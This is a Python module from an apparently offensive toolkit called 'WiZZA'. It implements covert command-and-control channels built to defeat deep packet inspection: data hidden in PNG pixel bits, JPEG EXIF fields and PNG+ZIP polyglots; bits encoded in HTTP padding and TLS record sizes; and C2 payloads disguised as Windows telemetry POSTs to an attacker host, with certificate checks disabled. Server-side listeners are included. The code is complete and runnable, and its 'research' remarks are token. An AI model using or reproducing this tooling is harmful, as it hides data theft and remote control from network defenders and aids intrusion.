"""
WiZZA — Steganography C2 Channel
op/modules/stego_c2.py

Hides C2 traffic inside legitimate-looking data so Deep Packet Inspection
finds nothing suspicious. Channels:

  1. PNG LSB         — data in least-significant bits of image pixels
  2. JPEG EXIF       — data in EXIF comment/UserComment fields
  3. HTTP/2 padding  — data encoded in frame padding lengths
  4. TLS record size — data encoded in TLS record length variations
  5. Polyglot file   — valid PNG that is also a valid ZIP archive
  6. Telemetry mimic — data hidden in fake Windows telemetry POST body

All channels are reversible — encode on sender, decode on receiver.
"""

import base64
import hashlib
import io
import json
import os
import random
import socket
import struct
import time
import zlib
from datetime import datetime


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def _pad(data: bytes, block=16) -> bytes:
    n = block - (len(data) % block)
    return data + bytes([n] * n)

def _unpad(data: bytes) -> bytes:
    n = data[-1]
    return data[:-n]

def _compress(data: bytes) -> bytes:
    return zlib.compress(data, level=9)

def _decompress(data: bytes) -> bytes:
    return zlib.decompress(data)

def _encode_payload(plaintext, key: str = "wizza") -> bytes:
    """Compress → XOR encrypt → base64. Accepts str or bytes."""
    raw = plaintext.encode() if isinstance(plaintext, str) else plaintext
    compressed = _compress(raw)
    encrypted  = _xor(compressed, key.encode())
    return base64.b64encode(encrypted)

def _decode_payload(b64_data: bytes, key: str = "wizza") -> bytes:
    """Reverse of _encode_payload. Returns bytes."""
    encrypted  = base64.b64decode(b64_data)
    compressed = _xor(encrypted, key.encode())
    return _decompress(compressed)


# ─────────────────────────────────────────────────────────────────────────────
# Channel 1: PNG LSB steganography
# ─────────────────────────────────────────────────────────────────────────────

def png_embed(cover_path: str, payload: str, out_path: str, key: str = "wizza"):
    """
    Embed payload into PNG image using LSB (least-significant bit) of each
    channel byte. 1 bit per byte → minimal visual change.
    Payload is compressed + XOR encrypted before embedding.

    cover_path: path to input PNG
    out_path:   path to write stego PNG
    """
    try:
        from PIL import Image
    except ImportError:
        print("[!] Pillow not installed — pip install Pillow")
        return False

    img  = Image.open(cover_path).convert("RGB")
    data = _encode_payload(payload, key)
    bits = "".join(f"{b:08b}" for b in data)
    # Prepend 32-bit length header
    length_bits = f"{len(bits):032b}"
    bits = length_bits + bits

    pixels = list(img.getdata())
    if len(bits) > len(pixels) * 3:
        print(f"[!] Image too small: need {len(bits)} bits, have {len(pixels)*3}")
        return False

    new_pixels = []
    bit_idx = 0
    for px in pixels:
        r, g, b = px
        if bit_idx < len(bits):
            r = (r & ~1) | int(bits[bit_idx]); bit_idx += 1
        if bit_idx < len(bits):
            g = (g & ~1) | int(bits[bit_idx]); bit_idx += 1
        if bit_idx < len(bits):
            b = (b & ~1) | int(bits[bit_idx]); bit_idx += 1
        new_pixels.append((r, g, b))

    out_img = Image.new("RGB", img.size)
    out_img.putdata(new_pixels)
    out_img.save(out_path, "PNG")
    print(f"[+] PNG stego written: {out_path}  ({len(bits)} bits embedded)")
    return True


def png_extract(stego_path: str, key: str = "wizza") -> str:
    """Extract payload from LSB-stego PNG."""
    try:
        from PIL import Image
    except ImportError:
        print("[!] Pillow not installed — pip install Pillow")
        return ""

    img    = Image.open(stego_path).convert("RGB")
    pixels = list(img.getdata())
    bits   = ""
    for r, g, b in pixels:
        bits += str(r & 1)
        bits += str(g & 1)
        bits += str(b & 1)

    # Read 32-bit length header
    length = int(bits[:32], 2)
    payload_bits = bits[32:32 + length]
    payload_bytes = bytes(
        int(payload_bits[i:i+8], 2) for i in range(0, len(payload_bits), 8)
    )
    return _decode_payload(payload_bytes, key)


# ─────────────────────────────────────────────────────────────────────────────
# Channel 2: JPEG EXIF steganography
# ─────────────────────────────────────────────────────────────────────────────

def jpeg_exif_embed(cover_path: str, payload: str, out_path: str, key: str = "wizza"):
    """
    Embed payload in JPEG EXIF UserComment field.
    EXIF is invisible to casual inspection and survives most social platforms.
    """
    try:
        import piexif
    except ImportError:
        print("[!] piexif not installed — pip install piexif")
        return False

    encoded = _encode_payload(payload, key)
    # UserComment format: 8-byte charset identifier + comment
    user_comment = b"UNICODE\x00" + encoded

    try:
        exif_dict = piexif.load(cover_path)
    except Exception:
        exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}}

    exif_dict["Exif"][piexif.ExifIFD.UserComment] = user_comment
    exif_bytes = piexif.dump(exif_dict)
    piexif.insert(exif_bytes, cover_path, out_path)
    print(f"[+] JPEG EXIF stego written: {out_path}")
    return True


def jpeg_exif_extract(stego_path: str, key: str = "wizza") -> str:
    """Extract payload from JPEG EXIF UserComment."""
    try:
        import piexif
    except ImportError:
        print("[!] piexif not installed — pip install piexif")
        return ""

    exif_dict    = piexif.load(stego_path)
    user_comment = exif_dict.get("Exif", {}).get(piexif.ExifIFD.UserComment, b"")
    encoded      = user_comment[8:]  # strip charset header
    return _decode_payload(encoded, key)


# ─────────────────────────────────────────────────────────────────────────────
# Channel 3: Polyglot file (PNG + ZIP)
# ─────────────────────────────────────────────────────────────────────────────

def polyglot_create(cover_png: str, payload: str, out_path: str, key: str = "wizza"):
    """
    Create a file that is simultaneously a valid PNG and a valid ZIP.
    PNG structure: signature + chunks. ZIP structure: local file headers + EOCD.
    ZIP appended after PNG IEND chunk — most image viewers ignore trailing data,
    ZIP parsers start from End-Of-Central-Directory at end of file.

    The embedded ZIP contains an encrypted payload file.
    """
    encoded = _encode_payload(payload, key)

    # Read cover PNG
    with open(cover_png, "rb") as f:
        png_data = f.read()

    # Create in-memory ZIP
    import zipfile
    zip_buf = io.BytesIO()
    with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("telemetry.dat", encoded)
    zip_data = zip_buf.getvalue()

    # Concatenate PNG + ZIP
    with open(out_path, "wb") as f:
        f.write(png_data)
        f.write(zip_data)

    print(f"[+] Polyglot PNG+ZIP: {out_path}  ({len(png_data)}B PNG + {len(zip_data)}B ZIP)")
    return True


def polyglot_extract(poly_path: str, key: str = "wizza") -> str:
    """Extract payload from polyglot PNG+ZIP file."""
    import zipfile
    try:
        with zipfile.ZipFile(poly_path, "r") as zf:
            encoded = zf.read("telemetry.dat")
        return _decode_payload(encoded, key)
    except Exception as e:
        print(f"[-] Extraction failed: {e}")
        return ""


# ─────────────────────────────────────────────────────────────────────────────
# Channel 4: HTTP timing / padding channel
# ─────────────────────────────────────────────────────────────────────────────

def http_padding_encode(payload: str, host: str, port: int = 443,
                        path: str = "/telemetry", key: str = "wizza"):
    """
    Encode data in HTTP request Content-Length padding variations.
    Each bit is encoded as small (0) or large (1) padding in the request body.
    Appears as normal telemetry POST traffic.

    For research/lab use — demonstrates timing channel concept.
    """
    encoded = _encode_payload(payload, key)
    bits    = "".join(f"{b:08b}" for b in encoded)

    print(f"[*] HTTP padding channel: {host}:{port}  ({len(bits)} bits)")

    # Transmit length header first (32 bits)
    length_bits = f"{len(bits):032b}"
    all_bits    = length_bits + bits

    for bit in all_bits:
        # bit=0: small body (64 bytes), bit=1: large body (192 bytes)
        pad_size = 64 if bit == "0" else 192
        body = os.urandom(pad_size)
        headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        try:
            s = socket.create_connection((host, port), timeout=5)
            s.sendall(headers.encode() + body)
            s.recv(1024)
            s.close()
        except Exception:
            pass
        time.sleep(0.05)  # 50ms inter-bit delay

    print(f"[+] Transmission complete")


def http_padding_decode(host: str, port: int = 8080,
                        path: str = "/telemetry", key: str = "wizza",
                        timeout: int = 30) -> str:
    """
    Receive HTTP padding channel on server side.
    Listens for connections, measures body size to reconstruct bits.
    """
    import threading

    bits     = []
    received = []
    lock     = threading.Lock()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((host, port))
    srv.listen(128)
    srv.settimeout(timeout)

    print(f"[*] Listening for padding channel on {host}:{port}")
    deadline = time.time() + timeout

    while time.time() < deadline:
        try:
            conn, _ = srv.accept()
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            # Parse Content-Length
            for line in data.decode(errors="replace").splitlines():
                if line.lower().startswith("content-length:"):
                    cl = int(line.split(":")[1].strip())
                    # Drain body
                    body = b""
                    while len(body) < cl:
                        body += conn.recv(cl - len(body))
                    bit = "0" if cl <= 100 else "1"
                    with lock:
                        bits.append(bit)
                    conn.sendall(b"HTTP/1.1 204 No Content\r\n\r\n")
                    conn.close()
                    break
        except socket.timeout:
            break
        except Exception:
            pass

    srv.close()

    if len(bits) < 32:
        return ""

    # Decode length header
    length  = int("".join(bits[:32]), 2)
    payload_bits = bits[32:32 + length]
    payload_bytes = bytes(
        int("".join(payload_bits[i:i+8]), 2)
        for i in range(0, len(payload_bits) - 7, 8)
    )
    return _decode_payload(payload_bytes, key)


# ─────────────────────────────────────────────────────────────────────────────
# Channel 5: Telemetry mimic (Windows DiagTrack lookalike)
# ─────────────────────────────────────────────────────────────────────────────

# Legitimate-looking telemetry endpoint mimics
TELEMETRY_HOSTS = [
    "settings-win.data.microsoft.com",
    "v10.events.data.microsoft.com",
    "watson.telemetry.microsoft.com",
]

# Fake event schema — real Windows telemetry looks like this
_TELEMETRY_TEMPLATE = {
    "ver":     "4.0",
    "name":    "Windows.System.DeviceHealthAttestation",
    "time":    "",
    "iKey":    "o:0a89d516ae714e01ae89041dc4c6af05",
    "ext": {
        "app":    {"id": "P:WINDOWS", "ver": "10.0.19041.1"},
        "device": {"localId": "", "make": "Microsoft", "model": "Surface Pro 7"},
        "os":     {"name": "Windows", "ver": "10.0.19041.1"},
        "sdk":    {"ver": "ACT-Windows-C++-No-8.2.2.0"},
    },
    "data": {}
}


def telemetry_send(payload: str, c2_host: str, c2_port: int = 443,
                   key: str = "wizza"):
    """
    Send C2 data disguised as Windows telemetry POST.
    Data is hidden in the 'data' field as fake diagnostic metrics.
    Traffic mimics legitimate DiagTrack/UTC telemetry.

    DPI sees: POST to a Microsoft-looking host with JSON telemetry body.
    Reality:  payload encoded inside 'data.metrics' field.
    """
    import urllib.request, urllib.parse

    encoded = _encode_payload(payload, key).decode()

    # Chunk payload into fake metric values (max 255 chars each)
    chunks     = [encoded[i:i+200] for i in range(0, len(encoded), 200)]
    event      = dict(_TELEMETRY_TEMPLATE)
    event["time"] = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000Z")
    event["ext"]["device"]["localId"] = hashlib.sha256(
        socket.gethostname().encode()).hexdigest()[:32]
    event["data"] = {
        "totalChunks":  len(chunks),
        "chunkIndex":   0,
        "sessionId":    hashlib.md5(os.urandom(8)).hexdigest(),
        "metrics": {f"m{i:04d}": c for i, c in enumerate(chunks)},
        "timestamp":    int(time.time()),
        "buildNumber":  "10.0.19041.1",
    }

    body = json.dumps(event).encode()
    url  = f"https://{c2_host}:{c2_port}/OneCollector/1.0/"

    req = urllib.request.Request(url, data=body, headers={
        "Content-Type":        "application/json; charset=utf-8",
        "Client-Id":           "NO_AUTH",
        "SDK-Version":         "ACT-Windows-C++-No-8.2.2.0",
        "Upload-Time":         str(int(time.time() * 1000)),
        "Content-Encoding":    "identity",
        "Connection":          "keep-alive",
        "User-Agent":          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                               "AppleWebKit/537.36 (KHTML, like Gecko) "
                               "Chrome/120.0.0.0 Safari/537.36",
    })
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        with urllib.request.urlopen(req, context=ctx, timeout=10) as r:
            print(f"[+] Telemetry send: HTTP {r.status}")
            return True
    except Exception as e:
        print(f"[-] Telemetry send failed: {e}")
        return False


def telemetry_recv(bind_host: str = "0.0.0.0", bind_port: int = 443,
                   key: str = "wizza", duration: int = 60) -> list:
    """
    C2 server side — receive telemetry-disguised beacons.
    Extracts payload from data.metrics field.
    Returns list of decoded payloads received during duration seconds.
    """
    from http.server import BaseHTTPRequestHandler, HTTPServer

    results  = []
    sessions = {}

    class TelemetryHandler(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass  # suppress access log

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            body   = self.rfile.read(length)
            try:
                event   = json.loads(body)
                data    = event.get("data", {})
                metrics = data.get("metrics", {})
                sess    = data.get("sessionId", "?")
                total   = data.get("totalChunks", 1)

                # Reassemble chunks
                sessions.setdefault(sess, {})
                for k, v in metrics.items():
                    idx = int(k[1:])
                    sessions[sess][idx] = v

                if len(sessions[sess]) >= total:
                    # All chunks received
                    encoded = "".join(sessions[sess][i]
                                      for i in sorted(sessions[sess]))
                    decoded = _decode_payload(encoded.encode(), key)
                    results.append(decoded)
                    print(f"[+] [{datetime.now().strftime('%H:%M:%S')}] "
                          f"Received: {decoded[:100]!r}")
                    del sessions[sess]
            except Exception as e:
                pass
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"acc":1}')

    srv = HTTPServer((bind_host, bind_port), TelemetryHandler)
    srv.timeout = 1
    print(f"[*] Telemetry C2 listener: {bind_host}:{bind_port} ({duration}s)")
    deadline = time.time() + duration
    while time.time() < deadline:
        srv.handle_request()
    srv.server_close()
    return results


# ─────────────────────────────────────────────────────────────────────────────
# Channel 6: TLS record size encoding
# ─────────────────────────────────────────────────────────────────────────────

def tls_size_encode(payload: str, host: str, port: int = 443,
                    sni: str = None, key: str = "wizza"):
    """
    Encode data in TLS record sizes.
    Even over encrypted TLS, the record LENGTH is visible to network observers.
    We encode bits as: small record (bit=0) vs large record (bit=1).
    Looks like normal HTTPS traffic with variable-length responses.

    Research note: this is a known side-channel. Countermeasure = padding.
    """
    import ssl

    encoded = _encode_payload(payload, key)
    bits    = f"{len(encoded)*8:032b}" + "".join(f"{b:08b}" for b in encoded)

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    raw = socket.create_connection((host, port), timeout=10)
    tls = ctx.wrap_socket(raw, server_hostname=sni or host)

    print(f"[*] TLS size channel: {host}:{port}  ({len(bits)} bits)")

    for bit in bits:
        # bit=0: 64B app data, bit=1: 512B app data
        record = os.urandom(64 if bit == "0" else 512)
        # Wrap in minimal HTTP request so TLS layer sends it as application data
        http_req = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                    f"Content-Length: {len(record)}\r\n\r\n").encode() + record
        try:
            tls.sendall(http_req)
            tls.recv(4096)
        except Exception:
            pass
        time.sleep(0.02)

    tls.close()
    print(f"[+] TLS size encoding complete")


# ─────────────────────────────────────────────────────────────────────────────
# Unified stego C2 wrapper
# ─────────────────────────────────────────────────────────────────────────────

def stego_send(payload: str, channel: str = "telemetry", **kwargs):
    """
    Send payload over chosen steganography channel.
    channel: png | jpeg | polyglot | http_pad | telemetry | tls_size
    """
    channels = {
        "png":       lambda: png_embed(kwargs["cover"], payload,
                                        kwargs.get("out", "/tmp/stego.png"),
                                        kwargs.get("key", "wizza")),
        "jpeg":      lambda: jpeg_exif_embed(kwargs["cover"], payload,
                                              kwargs.get("out", "/tmp/stego.jpg"),
                                              kwargs.get("key", "wizza")),
        "polyglot":  lambda: polyglot_create(kwargs["cover"], payload,
                                              kwargs.get("out", "/tmp/poly.png"),
                                              kwargs.get("key", "wizza")),
        "http_pad":  lambda: http_padding_encode(payload,
                                                  kwargs["host"],
                                                  kwargs.get("port", 80),
                                                  kwargs.get("path", "/telemetry"),
                                                  kwargs.get("key", "wizza")),
        "telemetry": lambda: telemetry_send(payload,
                                             kwargs["host"],
                                             kwargs.get("port", 443),
                                             kwargs.get("key", "wizza")),
        "tls_size":  lambda: tls_size_encode(payload,
                                              kwargs["host"],
                                              kwargs.get("port", 443),
                                              kwargs.get("sni"),
                                              kwargs.get("key", "wizza")),
    }
    if channel not in channels:
        print(f"[!] Unknown channel: {channel}")
        print(f"    Available: {', '.join(channels)}")
        return False
    return channels[channel]()


def stego_recv(channel: str = "telemetry", **kwargs) -> str:
    """Receive/extract payload from steganography channel."""
    if channel == "png":
        return png_extract(kwargs["path"], kwargs.get("key", "wizza"))
    elif channel == "jpeg":
        return jpeg_exif_extract(kwargs["path"], kwargs.get("key", "wizza"))
    elif channel == "polyglot":
        return polyglot_extract(kwargs["path"], kwargs.get("key", "wizza"))
    elif channel == "http_pad":
        return http_padding_decode(kwargs.get("host", "0.0.0.0"),
                                   kwargs.get("port", 8080),
                                   kwargs.get("path", "/telemetry"),
                                   kwargs.get("key", "wizza"),
                                   kwargs.get("timeout", 30))
    elif channel == "telemetry":
        results = telemetry_recv(kwargs.get("host", "0.0.0.0"),
                                  kwargs.get("port", 443),
                                  kwargs.get("key", "wizza"),
                                  kwargs.get("duration", 60))
        return "\n".join(results)
    else:
        print(f"[!] Unknown channel: {channel}")
        return ""


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="WiZZA Stego C2")
    p.add_argument("mode",    choices=["send","recv","test"])
    p.add_argument("channel", choices=["png","jpeg","polyglot","http_pad","telemetry","tls_size"])
    p.add_argument("--payload", default="WiZZA stego test")
    p.add_argument("--cover",   default=None)
    p.add_argument("--out",     default="/tmp/stego_out")
    p.add_argument("--host",    default="127.0.0.1")
    p.add_argument("--port",    type=int, default=443)
    p.add_argument("--key",     default="wizza")
    p.add_argument("--path",    default="/telemetry")
    p.add_argument("--duration",type=int, default=60)
    args = p.parse_args()

    if args.mode == "test":
        print("[*] Self-test: encode/decode round-trip")
        msg = b"WiZZA stego channel test -- CONFIDENTIAL"
        enc = _encode_payload(msg)
        dec = _decode_payload(enc)
        assert dec == msg, f"FAIL: {dec!r} != {msg!r}"
        print(f"[+] encode/decode OK: {dec.decode()}")

    elif args.mode == "send":
        stego_send(args.payload, args.channel,
                   cover=args.cover, out=args.out,
                   host=args.host, port=args.port,
                   key=args.key, path=args.path)

    elif args.mode == "recv":
        result = stego_recv(args.channel,
                            path=args.out, host=args.host,
                            port=args.port, key=args.key,
                            duration=args.duration)
        print(f"[+] Extracted: {result}")
